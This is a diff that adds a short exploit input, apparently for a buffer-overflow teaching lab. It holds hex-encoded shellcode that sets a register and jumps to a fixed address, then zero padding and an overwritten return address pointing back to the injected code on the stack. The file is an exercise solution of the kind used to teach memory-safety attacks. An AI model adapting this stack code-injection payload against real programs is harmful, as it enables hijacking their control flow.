@@ -1,0 +1,17 @@
+/*
+48 8b 3c 25 e4 44 60
+00
+48 c7 c0 ec 17 40 00
+50
+c3
+00 00 00
+*/
+
+48 8b 3c 25 e4 44 60    /* mov    0x6044e4,%rdi */
+00
+68 ec 17 40 00          /* push   $0x4017ec */
+c3                      /* ret */
+00 00                   /* alignment */
+
+0x00000000      0x00000000      0x00000000 0x00000000  0x00000000 0x00000000
+0x5561dc78 /*  jump address to head of stack, where our code injected */
